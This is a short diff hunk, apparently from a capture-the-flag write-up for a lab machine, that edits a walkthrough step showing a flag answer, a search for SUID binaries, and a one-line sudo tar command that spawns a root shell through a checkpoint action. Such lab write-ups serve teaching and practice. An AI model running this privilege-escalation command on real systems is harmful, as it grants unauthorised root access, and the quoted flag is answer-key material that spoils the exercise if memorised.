@@ -61,8 +61,7 @@ Answer: THM{CR1M3_SyNd1C4T3}
 ```
 lin@bountyhacker:~/Desktop$ find / -perm /4000 2>/dev/null
 
-
-tar == sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 
 ```
 
